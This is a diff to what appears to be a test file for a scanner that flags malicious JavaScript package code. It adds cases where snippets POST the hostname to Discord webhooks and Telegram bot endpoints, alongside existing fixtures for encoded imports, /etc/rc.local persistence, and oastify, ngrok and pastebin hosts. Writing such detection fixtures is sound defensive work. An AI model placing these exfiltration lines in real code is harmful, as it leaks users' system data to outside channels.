@@ -111,6 +111,17 @@ CASES = {
     "h_encoded_import": ("lib/e.js", "require(atob(name))", "require(name)"),
     "h_persistence": ("lib/p.js", "const target = '/etc/rc.local';", "const target = '/etc/hosts';"),
     "net_exfil_messenger": ("lib/t.js", "fetch('https://api.telegram.org/bot123456789:AAAA/sendMessage')", "fetch('https://api.example.invalid/send')"),
+    "net_chat_webhook": (
+        "lib/t.js",
+        "fetch('https://discord.com/api/webhooks/' + id + '/' + key, {method: 'POST', body})",
+        "fetch('https://discord.com/channels/' + id)",
+    ),
+    "net_chat_webhook_send": (
+        "lib/d.js",
+        "const t = '123456:FAKE-TOKEN';\n"
+        "fetch('https://api.telegram.org/bot' + t + '/sendDocument', {method: 'POST', body: os.hostname()})",
+        "fetch('https://api.telegram.org/bot' + token + '/sendMessage', {method: 'POST', body: os.hostname()})",
+    ),
     "net_oast_host": ("lib/o.js", "fetch('https://abc.oastify.com/x')", "fetch('https://abc.example.com/x')"),
     "net_tunnel_host": ("lib/n.js", "const u = 'https://abcd-1-2.ngrok-free.app/'", "const u = 'https://ngrok.com/docs'"),
     "net_paste_drop": ("lib/n.js", "fetch('https://pastebin.com/raw/abcd')", "fetch('https://example.invalid/raw/abcd')"),
